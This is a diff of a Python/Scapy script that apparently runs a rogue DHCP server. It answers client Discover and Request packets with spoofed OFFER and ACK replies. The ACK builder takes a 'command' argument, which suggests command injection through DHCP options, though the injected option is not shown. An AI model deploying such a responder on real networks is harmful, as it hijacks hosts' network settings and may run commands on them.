@@ -52,11 +52,11 @@ def dhcp_offer(raw_mac, xid):
     return packet
 
 
-def dhcp_ack(raw_mac, xid, command):
+def dhcp_ack(raw_mac, xid, command, requested_addr):
     packet = (Ether(src=get_if_hwaddr('wlp6s0'), dst='ff:ff:ff:ff:ff:ff') /
               IP(src="192.168.1.111", dst='192.168.1.255') /
               UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.1.111', xid=xid) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr=requested_addr, siaddr='192.168.1.111', xid=xid) /
               DHCP(options=[("message-type", "ack"),
                             ('server_id', '192.168.1.111'),
                             ('subnet_mask', '255.255.255.0'),
@@ -80,8 +80,8 @@ def handle_dhcp_packet(packet):
         if DHCP in packet and packet[DHCP].options[0][1] == 1:
             print('---')
             print('New DHCP Discover')
-            # print(packet.summary())
-            # print(ls(packet))
+            print(packet.summary())
+            print(ls(packet))
             # print "[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid)
             hostname = get_option(packet[DHCP].options, 'hostname')
             print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")
@@ -114,8 +114,8 @@ def handle_dhcp_packet(packet):
         elif DHCP in packet and packet[DHCP].options[0][1] == 3:
             print('---')
             print('New DHCP Request')
-            # print(packet.summary())
-            # print(ls(packet))
+            print(packet.summary())
+            print(ls(packet))
 
             requested_addr = get_option(packet[DHCP].options, 'requested_addr')
             hostname = get_option(packet[DHCP].options, 'hostname')
@@ -123,7 +123,7 @@ def handle_dhcp_packet(packet):
                 f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")
             xid = packet[BOOTP].xid
             # print "[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid)
-            p = dhcp_ack(raw_mac, xid, command)
+            p = dhcp_ack(raw_mac, xid, command, requested_addr)
             # print hexdump(packet)
             # print packet.show()
             print("[*] Sending ACK...")
